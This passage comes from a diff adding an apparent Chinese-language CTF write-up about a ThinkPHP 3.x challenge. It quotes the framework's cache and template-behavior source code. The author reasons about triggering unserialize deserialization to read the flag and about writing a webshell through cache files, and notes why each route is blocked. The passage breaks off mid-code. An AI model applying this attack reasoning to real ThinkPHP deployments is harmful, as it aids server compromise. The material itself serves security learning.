+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$type</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$name</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$name</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cache</span> <span class="o">=</span> <span class="nx">Think\Cache</span><span class="o">::</span><span class="na">getInstance</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$cache</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cache</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$cache</span> <span class="o">=</span> <span class="nx">Think\Cache</span><span class="o">::</span><span class="na">getInstance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$cache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$cache</span><span class="o">-&gt;</span><span class="na">rm</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$expire</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;expire&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;expire&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$expire</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$options</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$cache</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们会走到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="nv">$cache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个地方</p>
+<h2 id="get" class="headerLink">
+    <a href="#get" class="header-mark"></a>GET()</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* 读取缓存  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @access public  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @param string $name 缓存变量名  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @return mixed  
+</span></span></span><span class="line"><span class="cl"><span class="sd">*/</span>  
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">N</span><span class="p">(</span><span class="s1">&#39;cache_read&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$expire</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="nv">$expire</span> <span class="o">&amp;&amp;</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">filemtime</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$expire</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">//缓存过期删除缓存文件  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;DATA_CACHE_CHECK&#39;</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">//开启数据校验  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$check</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="o">-</span><span class="mi">3</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$check</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">//校验错误  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="o">-</span><span class="mi">3</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;DATA_CACHE_COMPRESS&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;gzcompress&#39;</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">//启用数据压缩  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$content</span> <span class="o">=</span> <span class="nx">gzuncompress</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原本的想法是可以进行unserialize从而来触发反序列化，再利用tp原来存在的一些方法来进行读取flag，但是这个地方的content是不可控的，所以这个地方就卡住了，但是我在这里发现了调用了filename的方法。</p>
+<h2 id="filename" class="headerLink">
+    <a href="#filename" class="header-mark"></a>filename()</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* 取得变量的存储文件名  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @access private  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @param string $name 缓存变量名  
+</span></span></span><span class="line"><span class="cl"><span class="sd">* @return string  
+</span></span></span><span class="line"><span class="cl"><span class="sd">*/</span>  
+</span></span><span class="line"><span class="cl"><span class="k">private</span> <span class="k">function</span> <span class="nf">filename</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;DATA_CACHE_KEY&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;DATA_CACHE_SUBDIR&#39;</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// 使用子目录  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;DATA_PATH_LEVEL&#39;</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">.=</span> <span class="nv">$name</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;temp&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;temp&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;temp&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看见对文件进行了写入的操作，那么我们的值都可控，是不是就可以写入马子了？但是这道题专门将tp的目录隔离在了web路径访问不到的地方并且对文件名进行了加密，且web根目录无可写权限。所以这里又卡住了。</p>
+<p>后面看见一个<code>common~runtime.php</code>，这个文件里面记录了所有thinkphp在运行时调用的类和函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Behavior</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Think\Storage</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Think\Think</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">ParseTemplateBehavior</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$engine</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_ENGINE_TYPE&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_content</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHE_PREFIX&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;think&#39;</span> <span class="o">==</span> <span class="nv">$engine</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkContentCache</span><span class="p">(</span><span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">],</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]))</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkCache</span><span class="p">(</span><span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">],</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">Storage</span><span class="o">::</span><span class="na">load</span><span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;CACHE_PATH&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_content</span><span class="p">)</span> <span class="o">.</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHFILE_SUFFIX&#39;</span><span class="p">),</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$tpl</span> <span class="o">=</span> <span class="nx">Think</span><span class="o">::</span><span class="na">instance</span><span class="p">(</span><span class="s1">&#39;Think\\Template&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$tpl</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$_content</span><span class="p">,</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">],</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$engine</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$class</span> <span class="o">=</span> <span class="nv">$engine</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;Think\\Template\\Driver\\&#39;</span> <span class="o">.</span> <span class="nx">ucwords</span><span class="p">(</span><span class="nv">$engine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$class</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$tpl</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$tpl</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$_content</span><span class="p">,</span> <span class="nv">$_data</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">E</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;_NOT_SUPPORT_&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;: &#39;</span> <span class="o">.</span> <span class="nv">$class</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="k">function</span> <span class="nf">checkCache</span><span class="p">(</span><span class="nv">$tmplTemplateFile</span><span class="p">,</span> <span class="nv">$prefix</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHE_ON&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$tmplCacheFile</span> <span class="o">=</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;CACHE_PATH&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$prefix</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$tmplTemplateFile</span><span class="p">)</span> <span class="o">.</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHFILE_SUFFIX&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Storage</span><span class="o">::</span><span class="na">has</span><span class="p">(</span><span class="nv">$tmplCacheFile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">filemtime</span><span class="p">(</span><span class="nv">$tmplTemplateFile</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">Storage</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="nv">$tmplCacheFile</span><span class="p">,</span> <span class="s1">&#39;mtime&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHE_TIME&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">Storage</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="nv">$tmplCacheFile</span><span class="p">,</span> <span class="s1">&#39;mtime&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_CACHE_TIME&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;LAYOUT_ON&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$layoutFile</span> <span class="o">=</span> <span class="nx">THEME_PATH</span> <span class="o">.</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;LAYOUT_NAME&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="nx">C</span><span class="p">(</span><span class="s1">&#39;TMPL_TEMPLATE_SUFFIX&#39;</span><span class="p">);</span>
